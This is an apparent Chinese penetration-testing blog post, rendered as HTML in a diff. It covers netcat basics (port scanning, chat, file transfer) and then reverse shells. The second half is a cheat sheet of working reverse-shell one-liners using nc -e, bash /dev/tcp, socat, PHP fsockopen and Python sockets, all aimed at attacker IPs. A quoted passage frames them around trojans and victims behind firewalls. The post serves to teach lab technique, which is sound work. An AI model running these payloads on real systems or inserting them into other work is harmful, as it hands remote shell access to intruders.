@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Linux nc命令与反弹shell"><meta name="keywords" content="Linux"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>Linux nc命令与反弹shell | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-nc%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Linux nc命令与反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">TCP端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDP%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">UDP端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3"><span class="toc-text">扫描指定端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8netcat%E5%AE%9E%E7%8E%B0%E5%B1%80%E5%9F%9F%E7%BD%91%E8%81%8A%E5%A4%A9"><span class="toc-text">使用netcat实现局域网聊天</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8netcat%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-text">使用netcat实现文件传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">什么是反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-text">反弹shell的各种姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat%E5%B7%A5%E5%85%B7%E5%8F%8D%E5%BC%B9"><span class="toc-text">netcat工具反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9"><span class="toc-text">bash直接反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socat%E5%8F%8D%E5%BC%B9%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-text">socat反弹一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="toc-text">php脚本反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="toc-text">python脚本反弹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93"><span class="toc-text">反弹shell 命令总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">30</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">11</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span></div><div id="post-info"><div id="post-title">Linux nc命令与反弹shell</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-12</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.9k</span><span class="post-meta__separator">|</span><span>阅读时长: 7 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Linux-nc命令与反弹shell"><a href="#Linux-nc命令与反弹shell" class="headerlink" title="Linux nc命令与反弹shell"></a>Linux nc命令与反弹shell</h1><p>Linux中nc命令是一个功能强大的网络工具，全称是netcat。  </p>
+<p>nc/netcat(选项)(参数)<br><strong>选项：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：在线帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>
+<p><strong>参数：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主机：指定主机的IP地址或主机名称；</span><br><span class="line">端口号：可以是单个整数或者是一个范围。</span><br></pre></td></tr></table></figure>
+
+<h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc -v -z -w2 192.168.0.3 1-100</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</span><br><span class="line">-w2：设置等待连线的时间为2s；</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# nc -v -z -w2 192.168.211.106 38324</span><br><span class="line">192.168.211.106: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.211.106] 38324 (?) open</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop# nc -v -z -w2 192.168.211.106 38322-38325</span><br><span class="line">192.168.211.106: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.211.106] 38324 (?) open</span><br></pre></td></tr></table></figure>
+
+<h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><pre><code># nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000</code></pre>
+<h2 id="扫描指定端口"><a href="#扫描指定端口" class="headerlink" title="扫描指定端口"></a>扫描指定端口</h2><pre><code># nc -nvv 192.168.0.1 80 //扫描 80端口
+(UNKNOWN) [192.168.0.1] 80 (?) open</code></pre>
+<h2 id="使用netcat实现局域网聊天"><a href="#使用netcat实现局域网聊天" class="headerlink" title="使用netcat实现局域网聊天"></a>使用netcat实现局域网聊天</h2><p>一端先启好监听：</p>
+<pre><code>nc -l 9999</code></pre>
+<p>另一端端进行连接：</p>
+<pre><code>nc 192.168.220.128 9999</code></pre>
+<p>连接之后的任一边的输入在另一边都可看到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Ubantu (192.168.118.137 9999)</span><br><span class="line"></span><br><span class="line">ldl@ubuntu:~$ nc -l 9999</span><br><span class="line">wode</span><br><span class="line">我的</span><br><span class="line">Linux真好用 ^H，^H^H-&#x3D;13</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#kali(192.168.118.134)</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop# nc 192.168.118.137 9999</span><br><span class="line">wode^H^H^H</span><br><span class="line">我的</span><br><span class="line">Linux真好用-&#x3D;13</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发现输入的内容（中文英文字符）都可以正确解析，但是非打印字符不会传输。退格等键无用。   </p>
+<p>Ctrl+C 断开连接。   </p>
+<h2 id="使用netcat实现文件传输"><a href="#使用netcat实现文件传输" class="headerlink" title="使用netcat实现文件传输"></a>使用netcat实现文件传输</h2><p>和局域网聊天是原理一样的，不过把输入输出重定向到文件<br>接收入端先启好监听：</p>
+<pre><code>nc -l 9999 &gt; recv.txt</code></pre>
+<p>发送端进行发送：</p>
+<pre><code>nc 192.168.220.128 9999 &lt; send.txt</code></pre>
+<p>不过传输完之后不会自动断开连接得手动ctrl+c断开，而且转输完成并没有什么标志不知是否已传完。</p>
+<hr>
+<p>接收端：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldl@ubuntu:~&#x2F;Desktop$ ls</span><br><span class="line">源代码</span><br><span class="line">ldl@ubuntu:~&#x2F;Desktop$ nc -l 9999 &gt; test.c</span><br><span class="line">^C</span><br><span class="line">ldl@ubuntu:~&#x2F;Desktop$ ls</span><br><span class="line">test.c  源代码</span><br></pre></td></tr></table></figure>
+
+<p>发送端：</p>
+<pre><code>root@kali:~/Desktop# nc 192.168.118.137 9999 &lt; test.c</code></pre>
+<hr>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><blockquote>
+<p>想要搞清楚这个问题，首先要搞清楚什么是反弹，为什么要反弹。</p>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
+<p>那么什么情况下正向连接不太好用了呢？</p>
+<ol>
+<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。它的ip会动态改变，你不能持续控制。</li>
+<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</li>
+</ol>
+<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。<br>本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<p>作者：玄魂工作室-玄魂</p>
+</blockquote>
+<h2 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h2><h3 id="netcat工具反弹"><a href="#netcat工具反弹" class="headerlink" title="netcat工具反弹"></a>netcat工具反弹</h3><p>(1)受害者（目标机 kali）</p>
+<pre><code>root@kali:~# nc -lvvp 8080 -t -e /bin/bash</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/Ie5H1DJL68.png?imageslim" alt="mark"></p>
+<p>(2)攻击者(Linux)</p>
+<pre><code>nc 192.168.118.138 8080</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/2G6kIKgbJ8.png?imageslim" alt="mark"></p>
+<h3 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a>bash直接反弹</h3><p>(1) 目标机bash一句话</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/attacker-IP/Port 0&gt;&amp;1
+e.g.
+bash -i &gt;&amp; /dev/tcp/192.168.118.138/1234 0&gt;&amp;1</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/CjLH7GHeaK.png?imageslim" alt="mark"></p>
+<p>(2) 攻击者监听shell</p>
+<pre><code>nc -lvvp Port
+e.g.
+nc -lvvp 1234</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/dm1Ah714Ic.png?imageslim" alt="mark"></p>
+<p>bash反弹一句话的拆分说明<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/2k2lEB4IfL.bmp" alt="mark"><br>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<h3 id="socat反弹一句话"><a href="#socat反弹一句话" class="headerlink" title="socat反弹一句话"></a>socat反弹一句话</h3><p>Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</p>
+<p>有关socat二进制可执行文件，大家可以到这个链接下载：<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
+<p><strong>kali中有</strong></p>
+<p>(1) 攻击机开启监听</p>
+<pre><code>socat tcp-listen:6666 -</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/H03LJdaJ2C.png?imageslim" alt="mark"></p>
+<p>(2) 靶机运行socat反弹shell</p>
+<pre><code>root@ubuntu:~# socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:192.168.118.138:6666</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/AlD5dA1icI.png?imageslim" alt="mark"></p>
+<h3 id="php脚本反弹"><a href="#php脚本反弹" class="headerlink" title="php脚本反弹"></a>php脚本反弹</h3><p>靶机上运行</p>
+<pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.118.138&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/ilAcf5E1E7.png?imageslim" alt="mark"></p>
+<p>攻击者上运行</p>
+<pre><code>nc -lvvp 8888</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/182DB6Cc8k.png?imageslim" alt="mark"></p>
+<h3 id="python脚本反弹"><a href="#python脚本反弹" class="headerlink" title="python脚本反弹"></a>python脚本反弹</h3><p>攻击者运行</p>
+<pre><code>nc -lvvp 8080</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/99dB7Imkg3.png?imageslim" alt="mark"></p>
+<p>靶机上运行</p>
+<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.138&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
+<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/9kEj4Fid8D.png?imageslim" alt="mark"></p>
+<hr>
+<p>先总结这几种，还有一些不常用，之后遇到再说。</p>
+<h2 id="反弹shell-命令总结"><a href="#反弹shell-命令总结" class="headerlink" title="反弹shell 命令总结"></a>反弹shell 命令总结</h2><p>bash版本：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/&lt;attackerIP&gt;/[port] 0&gt;&amp;1
+bash -i &gt;&amp; /dev/tcp/192.168.118.138/6666 0&gt;&amp;1</code></pre>
+<p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
+<p>python版本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<p>php版本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+<p>nc版本：</p>
+<pre><code> nc -e /bin/sh 10.0.0.1 1234
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+ nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87017">linux各种一句话反弹shell总结 </a></li>
+<li><a target="_blank" rel="noopener" href="http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">各种环境下反弹 shell 的方法 </a></li>
+<li><a target="_blank" rel="noopener" href="https://le4f.net/post/post/reverse-shell-during-the-penetration-test">渗透测试:反弹与转发小结</a></li>
+</ol>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="/v0w.top/2018/08/12/nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&amp;%E5%8F%8D%E5%BC%B9shell/">v0w.top/2018/08/12/nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&amp;%E5%8F%8D%E5%BC%B9shell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux/">Linux</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/13/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"><i class="fa fa-chevron-left">  </i><span> 目录穿越导致任意文件读取</span></a></div><div class="next-post pull-right"><a href="/2018/08/11/XMAN2018%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/"><span>XMAN2018 排位赛wp</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
+  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
+  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
+  avatar:'retro',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
